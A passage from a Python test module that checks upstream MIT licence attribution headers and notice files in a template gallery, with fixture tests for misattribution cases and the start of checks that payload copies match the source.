# special-cases the exact relative path ``LICENSE`` and maps it back to this
# repository's own root license, and ``payload_file_kind`` classifies that exact
# path as version metadata. A gallery file at ``artifact-gallery/LICENSE`` matches
# neither exact comparison today; G1 is what keeps the gallery from depending on
# that detail continuing to hold. Compared case-folded, because on a
# case-insensitive filesystem ``license`` and ``LICENSE`` are one file.
FORBIDDEN_NOTICE_NAME = "LICENSE"

# The single upstream this gallery derives from, named once here exactly as
# ``SPA-CONTRACT.md`` names it once for authors. G7 is what joins the two.
UPSTREAM_REPOSITORY = "anthropics/html-effectiveness"
# What the contract tells an author to write, and therefore what a conforming
# header carries. This was pinned to a github.com blob URL while
# SPA-CONTRACT.md and UPSTREAM-NOTICE.md both prescribe the relative path, so
# the literal matched no header any conforming author would produce — and
# because the value was never compared, nothing revealed the contradiction.
UPSTREAM_LICENSE_REFERENCE = "UPSTREAM-NOTICE.md"

# The licence the upstream project is under. Compared, not merely required to
# be non-empty: an artifact claiming "WTFPL-2.0" carried a value and passed.
UPSTREAM_LICENSE_ID = "MIT"

# The permission notice, pinned as a literal rather than read back out of the
# file under validation — a comparison against text derived from that same file
# asserts only that the file equals itself.
UPSTREAM_PERMISSION_NOTICE = """\
MIT License

Copyright (c) 2026 Anthropic PBC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

# Read back out of the notice above rather than written a second time. The
# copyright line G2 requires verbatim in the notice and the one G3 requires
# verbatim in every ported artifact are the same line, and two literals drift.
UPSTREAM_COPYRIGHT = UPSTREAM_PERMISSION_NOTICE.split("\n\n")[1]

# The attribution header's machine-readable shape. FR-020 fixes the header's
# *contents* and ``SPA-CONTRACT.md`` records it for authors as an HTML comment
# near the top of the file; the labels below are what make G6 and G7 possible at
# all, because a value that cannot be located cannot be compared to the entry
# that declares it. ART-002…005 inherit this shape along with the checks.
REPOSITORY_LABEL = "Upstream repository:"
UPSTREAM_FILE_LABEL = "Upstream file:"
LICENSE_LABEL = "License:"
LICENSE_TEXT_LABEL = "License text:"
DERIVATIVE_LABEL = "Modified derivative:"


class _AttributionElement(NamedTuple):
    """One required header element, and how each branch recognizes it.

    ``label`` is what G3 requires, with a non-empty value after it. ``literals``
    are the canonical strings G4 additionally refuses even unlabelled, so
    stripping the labels off a copied header does not launder it.
    """

    name: str
    label: str | None
    literals: tuple[str, ...]


# The six elements FR-020 enumerates. G3 requires every one of them and G4
# refuses every one of them, off this single table — which is what makes the two
# branches opposite directions on one claim rather than a claim on one side and
# a symptom on the other.
ATTRIBUTION_ELEMENTS: tuple[_AttributionElement, ...] = (
    _AttributionElement("upstream repository", REPOSITORY_LABEL, (UPSTREAM_REPOSITORY,)),
    _AttributionElement("upstream file", UPSTREAM_FILE_LABEL, ()),
    _AttributionElement("verbatim copyright line", None, (UPSTREAM_COPYRIGHT,)),
    _AttributionElement("license identifier", LICENSE_LABEL, ()),
    _AttributionElement("link to the full license text", LICENSE_TEXT_LABEL, (UPSTREAM_LICENSE_REFERENCE,)),
    _AttributionElement("modified-derivative statement", DERIVATIVE_LABEL, ()),
)

# The branch each ``origin`` takes. G5 asserts membership is a function onto
# exactly one of these, so a third value fails rather than matching neither.
ATTRIBUTION_BRANCHES: dict[str, str] = {UPSTREAM: "G3", REPOSITORY: "G4"}


class _CommentCollector(HTMLParser):
    """Every parser-recognized comment, in document order.

    Parser-recognized is the operative word, and it is the same distinction E3
    turns on: comment-shaped raw text inside a ``script`` element is not a
    comment, and an attribution header written there is not one either.
    """

    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.comments: list[str] = []

    def handle_comment(self, data: str) -> None:
        self.comments.append(data)


def _comments(text: str) -> list[str]:
    collector = _CommentCollector()
    collector.feed(text)
    collector.close()
    return collector.comments


def _labelled_value(text: str, label: str) -> str | None:
    """The text following ``label`` on the first line carrying it, or ``None``."""
    for line in text.splitlines():
        position = line.find(label)
        if position != -1:
            return line[position + len(label) :].strip()
    return None


def _carried(header: str, element: _AttributionElement) -> bool:
    """G3's direction — the element is present **and** carries a value.

    Presence and non-emptiness only. Whether a value is *correct* is a different
    question with a different owner: G7 compares the repository, G8 the licence
    identifier, and G9 the licence-text reference. Folding those comparisons in
    here would make G3 report the same defect G7 already names.
    """
    if element.label is None:
        return all(literal in header for literal in element.literals)
    return bool(_labelled_value(header, element.label))


def _attribution_evidence(text: str, *, labels: bool = True) -> list[tuple[str, str]]:
    """G4's direction — every upstream attribution element the text carries.

    ``labels=False`` drops the generic field labels and matches only the
    distinctive literals — the upstream repository name, the verbatim copyright
    line, the license URL. That distinction is what keeps G4 honest across a whole
    document: ``License:`` is a phrase ordinary content writes by accident, and a
    dependency table with a visible ``License: MIT`` row is not a provenance
    claim. The upstream repository name is not written by accident, so
    "Adapted from <upstream>" in visible prose still is one.
    """
    found: list[tuple[str, str]] = []
    for element in ATTRIBUTION_ELEMENTS:
        prefixes = (element.label,) if labels and element.label is not None else ()
        for marker in prefixes + element.literals:
            if marker in text:
                found.append((element.name, marker))
                break
    return found


def _attribution_header(text: str) -> str | None:
    """The comment carrying the attribution header, or ``None``.

    The first parser-recognized comment carrying any element. A header split
    across two comments is therefore not a header: FR-020 requires the elements
    in one, and a reader relying on the licensing claim reads one block.
    """
    for comment in _comments(text):
        if _attribution_evidence(comment):
            return comment
    return None


def _attributable(gallery_root: Path, origin: str) -> list[tuple[str, str, dict, Path]]:
    """Every entry at one ``source.origin`` **whose artifact exists**.

    Returns the entry's designation, its artifact's label, the entry, and the
    artifact path. An entry whose origin is neither branch is invisible here by
    construction, which is exactly the fail-open case G5 exists to close.
    """
    entries = _entries(gallery_root)
    if entries is None:
        return []
    designations = _designations(entries)
    found: list[tuple[str, str, dict, Path]] = []
    for index, entry in enumerate(entries):
        if not isinstance(entry, dict):
            continue  # B4 owns a non-object entry
        source = entry.get("source")
        if not isinstance(source, dict) or source.get("origin") != origin:
            continue  # B10 owns a malformed source, G5 an unrecognized origin
        identifier = entry.get("id")
        if not isinstance(identifier, str) or not identifier:
            continue  # B9 owns an unusable identifier
        artifact = _artifact_path(gallery_root, identifier)
        if artifact is None or not artifact.is_file():
            continue  # D1 and D2 own artifact existence
        found.append((designations[index], _artifact_label(identifier), entry, artifact))
    return found


def check_g1(gallery_root: Path) -> list[str]:
    """G1 — the notice exists and no gallery file is named ``LICENSE``."""
    failures: list[str] = []
    if not (gallery_root / UPSTREAM_NOTICE_FILE).is_file():
        failures.append(
            f"{UPSTREAM_NOTICE_FILE}: the upstream permission notice is missing, so every attribution "
            "header's link to the full license text points at nothing"
        )
    failures.extend(
        f"{_label(gallery_root, path)}: named '{FORBIDDEN_NOTICE_NAME}', which the payload builder maps "
        f"back to this repository's own license — the upstream notice is '{UPSTREAM_NOTICE_FILE}'"
        for path in _gallery_files(gallery_root)
        if path.name.casefold() == FORBIDDEN_NOTICE_NAME.casefold()
    )
    return failures


def check_g2(gallery_root: Path) -> list[str]:
    """G2 — the notice reproduces the upstream permission notice verbatim.

    Paragraph by paragraph first, so a failure names the part that changed, and
    then contiguously — every paragraph present but reordered or interleaved is
    not a reproduction of the notice.
    """
    notice = gallery_root / UPSTREAM_NOTICE_FILE
    if not notice.is_file():
        return []  # G1 owns the missing file
    text = _read_exact_or_none(notice)
    if text is None:
        return [f"{UPSTREAM_NOTICE_FILE}: is not decodable as UTF-8, so the permission notice cannot be compared"]
    failures = [
        f"{UPSTREAM_NOTICE_FILE}: the permission notice is altered or truncated at "
        f"'{paragraph.splitlines()[0]}'"
        for paragraph in UPSTREAM_PERMISSION_NOTICE.split("\n\n")
        if paragraph not in text
    ]
    if not failures and UPSTREAM_PERMISSION_NOTICE not in text:
        failures.append(
            f"{UPSTREAM_NOTICE_FILE}: every paragraph of the permission notice is present but not "
            "contiguous and in order, so the notice is not reproduced verbatim"
        )
    return failures


def check_g3(gallery_root: Path) -> list[str]:
    """G3 — an ``upstream`` entry's artifact carries every header element."""
    failures: list[str] = []
    for where, label, _entry, artifact in _attributable(gallery_root, UPSTREAM):
        header = _attribution_header(_document_text(artifact))
        if header is None:
            failures.append(
                f"{label}: {where}: field 'source': origin '{UPSTREAM}', but the artifact carries no "
                "attribution header — FR-020 requires one as an HTML comment near the top of the file"
            )
            continue
        failures.extend(
            f"{label}: {where}: the attribution header is missing its {element.name}"
            for element in ATTRIBUTION_ELEMENTS
            if not _carried(header, element)
        )
    return failures


def check_g4(gallery_root: Path) -> list[str]:
    """G4 — a ``repository`` entry's artifact carries **no** attribution header.

    Every element G3 requires, refused here — not the copyright line alone. An
    artifact carrying repository, filename, license identifier, and license link
    while avoiding that one line is a misattribution wearing a convincing header.

    Two reads, because one text is not enough. The **header comment** is checked
    for every element including the generic field labels, which is the direction
    G3 mirrors. The **whole document** is checked for the distinctive literals
    only — the upstream repository name, the verbatim copyright line, the license
    URL — so a claim made in visible prose rather than a header still fails.

    The split is what removes a false positive without opening a hole. Sweeping
    the whole document for *labels* meant a dependency table with a visible
    ``License: MIT`` row failed a repository-origin artifact, reported as
    "carries an upstream attribution element", with no way to comply short of not
    writing the word; `design-system`, `status-report` and `feature-flags` are all
    plausible carriers of that row. Restricting the sweep to the header alone
    would have gone too far the other way: "Adapted from <upstream>" in prose is a
    provenance claim, and nobody writes the upstream repository name by accident.
    """
    failures: list[str] = []
    for where, label, _entry, artifact in _attributable(gallery_root, REPOSITORY):
        text = _document_text(artifact)
        header = _attribution_header(text)
        found: list[tuple[str, str]] = list(_attribution_evidence(text, labels=False))
        seen = {name for name, _ in found}
        if header is not None:
            found.extend(
                (name, evidence) for name, evidence in _attribution_evidence(header) if name not in seen
            )
        failures.extend(
            f"{label}: {where}: field 'source': origin '{REPOSITORY}', but the artifact carries an upstream "
            f"attribution element — {name}: '{evidence}'"
            for name, evidence in found
        )
    return failures


def check_g5(gallery_root: Path) -> list[str]:
    """G5 — every entry takes exactly one of the G3/G4 branches.

    Counted over the branch set rather than tested as two independent
    conditionals. An ``origin`` matching neither is invisible to both branches,
    so an upstream-derived artifact would ship with no attribution header, no
    misattribution check, and a green suite.
    """
    entries = _entries(gallery_root)
    if entries is None:
        return []  # B1 and B3 own a catalog that names nothing
    designations = _designations(entries)
    failures: list[str] = []
    for index, entry in enumerate(entries):
        if not isinstance(entry, dict):
            continue  # B4 owns a non-object entry
        source = entry.get("source")
        origin = source.get("origin") if isinstance(source, dict) else None
        taken = [check for branch, check in ATTRIBUTION_BRANCHES.items() if origin == branch]
        if len(taken) != 1:
            failures.append(
                _catalog_failure(
                    designations[index],
                    f"field 'source': key 'origin': {origin!r} takes {len(taken)} of the "
                    f"{len(ATTRIBUTION_BRANCHES)} attribution branches "
                    f"({', '.join(ATTRIBUTION_BRANCHES.values())}) rather than exactly one, so the "
                    "attribution gate does not run for this entry",
                )
            )
    return failures


def _agreement_failures(gallery_root: Path, label_text: str, expected: Callable[[dict], object]) -> list[str]:
    """The shared body of G6 and G7 — one header value against its declaration."""
    failures: list[str] = []
    for where, label, entry, artifact in _attributable(gallery_root, UPSTREAM):
        header = _attribution_header(_document_text(artifact))
        if header is None:
            continue  # G3 owns an absent header
        named = _labelled_value(header, label_text)
        if not named:
            continue  # G3 owns the missing element
        declared = expected(entry)
        if not isinstance(declared, str):
            continue  # B10 owns a source that declares nothing comparable
        if named != declared:
            failures.append(
                f"{label}: {where}: the attribution header names '{label_text} {named}', but "
                f"'{declared}' is what it must agree with — a header can be well-formed and false at once"
            )
    return failures


def check_g6(gallery_root: Path) -> list[str]:
    """G6 — the header's upstream file equals the entry's ``source.file``.

    What a header copy-pasted from a neighbouring artifact produces: every
    element present, G3 satisfied exactly, and the provenance claim false.
    """
    return _agreement_failures(
        gallery_root,
        UPSTREAM_FILE_LABEL,
        lambda entry: entry.get("source", {}).get("file"),
    )


def check_g7(gallery_root: Path) -> list[str]:
    """G7 — the header's upstream repository equals the one named here."""
    return _agreement_failures(gallery_root, REPOSITORY_LABEL, lambda _entry: UPSTREAM_REPOSITORY)


def check_g8(gallery_root: Path) -> list[str]:
    """G8 — the header's licence identifier is the upstream licence.

    G3 asks only that a value follow the label, which left this presence-only: a
    header reading ``License: WTFPL-2.0`` satisfied G3, G4 and G6, and the
    reference scan never saw it because the header is a comment and comments are
    exempt. An artifact could claim any licence it liked. The upstream licence is
    a fact about the upstream project, not a per-artifact choice, so it is
    compared rather than merely required.
    """
    return _agreement_failures(gallery_root, LICENSE_LABEL, lambda _entry: UPSTREAM_LICENSE_ID)


def check_g9(gallery_root: Path) -> list[str]:
    """G9 — the header's licence-text reference points at the notice in this gallery.

    Presence-only for the same reason as G8, and with a sharper consequence:
    an artifact could point a reader at any URL for "the full license text".
    The reference is the shipped notice, by the relative path
    ``SPA-CONTRACT.md`` prescribes — which is also the value this module pins, a
    pairing that was wrong until G8 and G9 made the literal load-bearing enough
    to notice.
    """
    return _agreement_failures(gallery_root, LICENSE_TEXT_LABEL, lambda _entry: UPSTREAM_LICENSE_REFERENCE)


GROUP_G_CHECKS: tuple[tuple[str, Callable[[Path], list[str]]], ...] = (
    ("G1", check_g1),
    ("G2", check_g2),
    ("G3", check_g3),
    ("G4", check_g4),
    ("G5", check_g5),
    ("G6", check_g6),
    ("G7", check_g7),
    ("G8", check_g8),
    ("G9", check_g9),
)


class UpstreamAttributionTests(unittest.TestCase):
    """Group G against the shipped gallery.

    G1, G2, and G5 read files the gallery has always shipped and are asserted
    non-vacuous below. G3, G4, G6, and G7 pair entries with artifacts, and under
    ART-001 they swept an empty set — that vacuity was asserted rather than left
    implied, because a green attribution gate that never ran reads exactly like
    one that did.

    ART-002 ports the first artifacts, so those four now bind for the first
    time, and the assertion below inverts with them: it states which entries are
    paired rather than that none are. The obligation is unchanged — say out loud
    what this group is actually reading — and it is why the assertion was
    rewritten rather than removed.
    """

    def test_group_g_passes_against_the_shipped_gallery(self) -> None:
        for name, check in GROUP_G_CHECKS:
            with self.subTest(msg=name):
                self.assertEqual(check(GALLERY_ROOT), [])

    def test_g1_and_g2_read_a_notice_that_is_actually_shipped(self) -> None:
        """Non-vacuity: the comparison runs against a real file, not an absent one."""
        notice = GALLERY_ROOT / UPSTREAM_NOTICE_FILE
        self.assertTrue(notice.is_file(), f"{UPSTREAM_NOTICE_FILE} is absent, so G2 asserts nothing")
        self.assertIn(UPSTREAM_COPYRIGHT, _read_exact(notice))

    def test_g5_sweeps_every_seeded_entry(self) -> None:
        """Non-vacuity: the branch discriminator runs over all 21 rows."""
        entries = _entries(GALLERY_ROOT)
        self.assertIsNotNone(entries)
        self.assertEqual(len(entries), SEEDED_ENTRY_COUNT)

    def test_the_shipped_gallery_pairs_exactly_its_shipped_entries(self) -> None:
        """Which entries G3, G4, G6, and G7 actually read — stated, not implied.

        The pairing is keyed on artifact existence, and D1/D2 hold existence and
        ``status`` equivalent, so the paired set is the shipped set at each
        origin. Asserting the identifiers rather than merely a count is what
        makes the statement survive a later template shipping under the wrong
        origin.
        """
        for origin in ORIGINS:
            with self.subTest(msg=origin):
                paired = {entry["id"] for _, _, entry, _ in _attributable(GALLERY_ROOT, origin)}
                shipped = {
                    entry["id"]
                    for entry in (_entries(GALLERY_ROOT) or [])
                    if isinstance(entry, dict)
                    and entry.get("status") == SHIPPED
                    and isinstance(entry.get("source"), dict)
                    and entry["source"].get("origin") == origin
                }
                self.assertEqual(paired, shipped)

    def test_every_upstream_entry_status_agrees_with_its_artifact(self) -> None:
        """The biconditional, read at the origin G3 depends on.

        ART-001's version asserted every upstream entry was still ``planned``,
        which was the reason the pairing above swept nothing. ART-002 flips the
        first of them, so that statement is now false and this one replaces it:
        an upstream entry reads ``shipped`` exactly when its artifact exists.

        The non-vacuity guard is kept and sharpened. It is no longer enough that
        some upstream entry exists — once anything is ported, at least one must
        be paired, or G3, G4, G6, and G7 have quietly gone back to asserting
        nothing while still reporting green.
        """
        entries = _entries(GALLERY_ROOT)
        upstream = [entry for entry in entries if entry["source"]["origin"] == UPSTREAM]
        self.assertTrue(upstream, "no upstream entry at all — G3 would be vacuous for a second reason")
        for entry in upstream:
            with self.subTest(msg=entry["id"]):
                artifact = _artifact_path(GALLERY_ROOT, entry["id"])
                exists = artifact is not None and artifact.is_file()
                self.assertEqual(
                    entry["status"] == SHIPPED,
                    exists,
                    f"entry {entry['id']!r}: status {entry['status']!r} disagrees with artifact presence",
                )
        if _artifact_files(GALLERY_ROOT, "*.html"):
            self.assertTrue(
                _attributable(GALLERY_ROOT, UPSTREAM),
                "artifacts are shipped but none is paired with an upstream entry — G3, G4, G6 and G7 "
                "would report green while reading an empty set",
            )


# --- Group G fixtures ------------------------------------------------------

# The upstream filename the fixture entry declares. Read from the same builder
# the catalog fixture uses, so a header that agrees with its entry agrees by
# construction rather than by a literal repeated in two places.
FIXTURE_ATTRIBUTED_ID = FIXTURE_ENTRY_ID
FIXTURE_ATTRIBUTED_LABEL = _artifact_label(FIXTURE_ATTRIBUTED_ID)
FIXTURE_NEIGHBOUR_FILE = "07-neighbour.html"
FIXTURE_FOREIGN_REPOSITORY = "someone-else/other-templates"


class UpstreamAttributionFixtureCase(CatalogFixtureCase):
    """A synthetic gallery pairing one entry with one artifact.

    Every case ships exactly one artifact under exactly one entry, then breaks
    one element of the header or one field of the entry — so the failure names
    the defect the case introduced.
    """

    def attribution_lines(
        self,
        *,
        upstream_file: str | None = None,
        repository: str = UPSTREAM_REPOSITORY,
    ) -> dict[str, str]:
        """One header line per element, keyed by the name G3 reports it under."""
        declared = self.entry(SEEDED_IDS.index(FIXTURE_ATTRIBUTED_ID), FIXTURE_ATTRIBUTED_ID)["source"]["file"]
        return {
            "upstream repository": f"{REPOSITORY_LABEL} {repository}",
            "upstream file": f"{UPSTREAM_FILE_LABEL} {upstream_file or declared}",
            "verbatim copyright line": UPSTREAM_COPYRIGHT,
            "license identifier": f"{LICENSE_LABEL} MIT",
            "link to the full license text": f"{LICENSE_TEXT_LABEL} {UPSTREAM_LICENSE_REFERENCE}",
            "modified-derivative statement": (
                f"{DERIVATIVE_LABEL} modified from the upstream original, not the original itself"
            ),
        }

    def header(self, lines: dict[str, str]) -> str:
        return "<!--\n" + "\n".join(lines.values()) + "\n-->\n"

    def ship(
        self,
        *,
        header: str = "",
        origin: str = UPSTREAM,
        upstream_file: str | None = None,
        body: str = "",
    ) -> None:
        """One entry at ``origin``, and the artifact its identifier derives."""
        catalog = self.catalog()
        entry = self.entry_at(catalog, FIXTURE_ATTRIBUTED_ID)
        entry["status"] = SHIPPED
        if origin == UPSTREAM:
            entry["source"] = {"origin": origin, "file": upstream_file or entry["source"]["file"]}
        else:
            entry["source"] = {"origin": origin}
        self.write_manifest(catalog)
        self.write(
            f"{TEMPLATES_DIR}/{FIXTURE_ATTRIBUTED_ID}.html",
            f"<!doctype html>\n<html lang=\"en\">\n{header}<head></head>\n<body>{body}</body>\n</html>\n",
        )

    def write_notice(self, text: str = UPSTREAM_PERMISSION_NOTICE, *, name: str = UPSTREAM_NOTICE_FILE) -> Path:
        return self.write(name, f"# Upstream Permission Notice\n\n```text\n{text}```\n")


class UpstreamAttributionFixtureTests(UpstreamAttributionFixtureCase):
    """Group G against synthetic galleries built in a temporary directory."""

    # -- the conforming baseline, so every rejection below is attributable --

    def test_a_conforming_gallery_passes_every_check(self) -> None:
        self.write_notice()
        self.ship(header=self.header(self.attribution_lines()))

        self.assertEqual([failure for _, check in GROUP_G_CHECKS for failure in check(self.gallery)], [])

    # -- G1: the notice exists, under a name the payload builder cannot claim --

    def test_g1_rejects_an_absent_notice(self) -> None:
        self.assertReports(check_g1(self.gallery), UPSTREAM_NOTICE_FILE)

    def test_g1_rejects_a_notice_named_license(self) -> None:
        self.write_notice(name=FORBIDDEN_NOTICE_NAME)

        self.assertReports(check_g1(self.gallery), FORBIDDEN_NOTICE_NAME)

    def test_g1_rejects_the_forbidden_name_case_folded(self) -> None:
        self.write_notice()
        self.write(FORBIDDEN_NOTICE_NAME.lower(), "not this repository's license\n")

        self.assertReports(check_g1(self.gallery), FORBIDDEN_NOTICE_NAME.lower())

    # -- G2: verbatim, which is the only thing reproducing a notice can mean --

    def test_g2_rejects_a_truncated_notice(self) -> None:
        self.write_notice(UPSTREAM_PERMISSION_NOTICE.split("\n\n")[0] + "\n")

        self.assertReports(check_g2(self.gallery), UPSTREAM_NOTICE_FILE, UPSTREAM_COPYRIGHT)

    def test_g2_rejects_an_altered_copyright_line(self) -> None:
        self.write_notice(UPSTREAM_PERMISSION_NOTICE.replace("2026", "2025"))

        self.assertReports(check_g2(self.gallery), UPSTREAM_NOTICE_FILE, UPSTREAM_COPYRIGHT)

    def test_g2_rejects_a_notice_whose_paragraphs_are_all_present_but_reordered(self) -> None:
        paragraphs = UPSTREAM_PERMISSION_NOTICE.split("\n\n")
        self.write_notice("\n\n".join(paragraphs[1:] + paragraphs[:1]))

        self.assertReports(check_g2(self.gallery), UPSTREAM_NOTICE_FILE)

    def test_g2_defers_an_absent_notice_to_g1(self) -> None:
        self.assertEqual(check_g2(self.gallery), [])

    # -- G3: every element, named individually when it is the one missing --

    def test_g3_rejects_an_artifact_with_no_attribution_header(self) -> None:
        self.ship()

        self.assertReports(check_g3(self.gallery), FIXTURE_ATTRIBUTED_LABEL)

    def test_g3_reports_each_missing_element_by_name(self) -> None:
        for element in ATTRIBUTION_ELEMENTS:
            with self.subTest(msg=element.name):
                self.setUp()
                lines = self.attribution_lines()
                del lines[element.name]
                self.ship(header=self.header(lines))

                self.assertReports(check_g3(self.gallery), FIXTURE_ATTRIBUTED_LABEL, element.name)

    def test_g3_rejects_a_label_with_no_value_after_it(self) -> None:
        lines = self.attribution_lines()
        lines["upstream file"] = UPSTREAM_FILE_LABEL
        self.ship(header=self.header(lines))

        self.assertReports(check_g3(self.gallery), FIXTURE_ATTRIBUTED_LABEL, "upstream file")

    def test_g3_rejects_a_header_that_is_not_a_parser_recognized_comment(self) -> None:
        """A header inside script content is raw text, not a comment (E3's distinction)."""
        lines = self.attribution_lines()
        self.ship(body=f"<script>\n{chr(10).join(lines.values())}\n</script>")

        self.assertReports(check_g3(self.gallery), FIXTURE_ATTRIBUTED_LABEL)

    def test_g3_rejects_a_header_split_across_two_comments(self) -> None:
        lines = self.attribution_lines()
        first = dict(list(lines.items())[:3])
        second = dict(list(lines.items())[3:])
        self.ship(header=self.header(first) + self.header(second))

        self.assertReports(check_g3(self.gallery), FIXTURE_ATTRIBUTED_LABEL)

    # -- G4: the same six elements, refused from the other direction --

    def test_g4_rejects_a_repository_artifact_carrying_the_copyright_line(self) -> None:
        self.ship(origin=REPOSITORY, header=f"<!--\n{UPSTREAM_COPYRIGHT}\n-->\n")

        self.assertReports(check_g4(self.gallery), FIXTURE_ATTRIBUTED_LABEL, "verbatim copyright line")

    def test_g4_rejects_each_element_on_its_own(self) -> None:
        lines = self.attribution_lines()
        for element in ATTRIBUTION_ELEMENTS:
            with self.subTest(msg=element.name):
                self.setUp()
                self.ship(origin=REPOSITORY, header=f"<!--\n{lines[element.name]}\n-->\n")

                self.assertReports(check_g4(self.gallery), FIXTURE_ATTRIBUTED_LABEL, element.name)

    def test_g4_rejects_a_complete_header_that_omits_only_the_copyright_line(self) -> None:
        """The case the earlier copyright-line-only formulation let through."""
        lines = self.attribution_lines()
        del lines["verbatim copyright line"]
        self.ship(origin=REPOSITORY, header=self.header(lines))

        self.assertReports(check_g4(self.gallery), FIXTURE_ATTRIBUTED_LABEL, "upstream repository")

    def test_g4_rejects_an_unlabelled_upstream_repository_name(self) -> None:
        self.ship(origin=REPOSITORY, body=f"<p>Adapted from {UPSTREAM_REPOSITORY}.</p>")

        self.assertReports(check_g4(self.gallery), FIXTURE_ATTRIBUTED_LABEL, "upstream repository")

    def test_g4_accepts_a_visible_license_row_in_ordinary_content(self) -> None:
        """``License:`` is a phrase ordinary content writes by accident.

        A dependency table with a visible ``License: MIT`` row is not a
        provenance claim, and a repository-origin artifact carrying one had no way
        to comply short of not writing the word. Generic field labels are read in
        the header comment only; the distinctive literals are read everywhere,
        which is what keeps the test above passing.
        """
        self.ship(origin=REPOSITORY, body="<table><tr><td>License: MIT</td></tr></table>")

        self.assertEqual(check_g4(self.gallery), [])

    def test_g4_accepts_a_repository_artifact_carrying_no_element(self) -> None:
        self.ship(origin=REPOSITORY, body="<h1>Repository-authored</h1>")

        self.assertEqual(check_g4(self.gallery), [])

    # -- G5: exhaustiveness, which is what makes green mean the gate ran --

    def test_g5_rejects_an_origin_matching_neither_branch(self) -> None:
        catalog = self.catalog()
        self.entry_at(catalog, FIXTURE_ATTRIBUTED_ID)["source"] = {"origin": "vendor", "file": "x.html"}
        self.write_manifest(catalog)

        self.assertReports(check_g5(self.gallery), FIXTURE_ATTRIBUTED_ID, "vendor")

    def test_g5_rejects_a_missing_source(self) -> None:
        catalog = self.catalog()
        del self.entry_at(catalog, FIXTURE_ATTRIBUTED_ID)["source"]
        self.write_manifest(catalog)

        self.assertReports(check_g5(self.gallery), FIXTURE_ATTRIBUTED_ID)

    def test_an_unrecognized_origin_is_invisible_to_g3_and_g4(self) -> None:
        """Why G5 exists: neither branch reports the entry it fails to claim."""
        self.write_notice()
        catalog = self.catalog()
        entry = self.entry_at(catalog, FIXTURE_ATTRIBUTED_ID)
        entry["status"] = SHIPPED
        entry["source"] = {"origin": "vendor", "file": FIXTURE_NEIGHBOUR_FILE}
        self.write_manifest(catalog)
        self.write(f"{TEMPLATES_DIR}/{FIXTURE_ATTRIBUTED_ID}.html", "<!doctype html>\n<html></html>\n")

        self.assertEqual(check_g3(self.gallery), [])
        self.assertEqual(check_g4(self.gallery), [])
        self.assertReports(check_g5(self.gallery), FIXTURE_ATTRIBUTED_ID)

    # -- G6/G7: agreement, because presence is not provenance --

    def test_g6_rejects_a_header_naming_a_different_upstream_file(self) -> None:
        """A header copy-pasted from a neighbouring artifact — well-formed and false."""
        self.ship(header=self.header(self.attribution_lines(upstream_file=FIXTURE_NEIGHBOUR_FILE)))

        self.assertEqual(check_g3(self.gallery), [])
        self.assertReports(check_g6(self.gallery), FIXTURE_ATTRIBUTED_LABEL, FIXTURE_NEIGHBOUR_FILE)

    def test_g7_rejects_a_header_naming_a_different_upstream_repository(self) -> None:
        self.ship(header=self.header(self.attribution_lines(repository=FIXTURE_FOREIGN_REPOSITORY)))

        self.assertEqual(check_g3(self.gallery), [])
        self.assertReports(check_g7(self.gallery), FIXTURE_ATTRIBUTED_LABEL, FIXTURE_FOREIGN_REPOSITORY)

    def test_g6_and_g7_defer_an_absent_header_to_g3(self) -> None:
        self.ship()

        self.assertEqual(check_g6(self.gallery), [])
        self.assertEqual(check_g7(self.gallery), [])


# ---------------------------------------------------------------------------
# Group F — payload reach (FR-018) — BLOCKING
# ---------------------------------------------------------------------------

DIST_ROOT = REPO_ROOT / "dist"
CLAUDE = "claude"
CODEX = "codex"
PAYLOAD_PLATFORMS: tuple[str, ...] = (CLAUDE, CODEX)


def _payload_gallery(dist_root: Path, platform: str) -> Path:
    """One platform's payload copy of the gallery.

    Composed from the source roots rather than from two path literals, so the
    payload location cannot drift from the source location it mirrors.
    """
    return dist_root / platform / PLUGIN_ROOT.name / GALLERY_ROOT.name


def _relative_files(root: Path) -> set[str]:
    """Every file under a root, relative and posix; an absent root is empty."""
    if not root.is_dir():
        return set()
    return {path.relative_to(root).as_posix() for path in root.rglob("*") if path.is_file()}


def _path_set_failures(gallery_root: Path, dist_root: Path, platform: str) -> list[str]:
    """The two directions of set equality, each naming the offending path."""
    payload = _relative_files(_payload_gallery(dist_root, platform))
    source = _relative_files(gallery_root)
    return [
        f"{relative}: under the gallery source but absent from the {platform} payload — "
        "'copy_optional_xplat008' is fail-silent, so an absent name produces no build error"
        for relative in sorted(source - payload)
    ] + [
        f"{relative}: under the {platform} payload but absent from the gallery source — a stale copy the "
        "build left behind"
        for relative in sorted(payload - source)
    ]


def _content_failures(gallery_root: Path, dist_root: Path, platform: str) -> list[str]:
    """Byte equality over the paths both sides carry; F1/F2 own the rest."""
    payload_root = _payload_gallery(dist_root, platform)
    failures: list[str] = []
    for relative in sorted(_relative_files(gallery_root) & _relative_files(payload_root)):
        source_bytes = (gallery_root / relative).read_bytes()
        payload_bytes = (payload_root / relative).read_bytes()
        if source_bytes != payload_bytes:
            failures.append(
                f"{relative}: differs from its {platform} payload copy ({len(source_bytes)} source bytes, "
                f"{len(payload_bytes)} payload bytes) — truncated, stale, or rewritten"
            )
    return failures


def check_f1(gallery_root: Path, dist_root: Path = DIST_ROOT) -> list[str]:
    """F1 — the Claude payload's gallery path set equals the source's.

    ``dist_root`` defaults to the committed payload root and is a parameter for
    the same reason ``gallery_root`` is: a check that reads the constant cannot
    be pointed at a fixture, and both sides of this comparison need pointing.
    """
    return _path_set_failures(gallery_root, dist_root, CLAUDE)


def check_f2(gallery_root: Path, dist_root: Path = DIST_ROOT) -> list[str]:
    """F2 — the Codex payload's gallery path set equals the source's."""
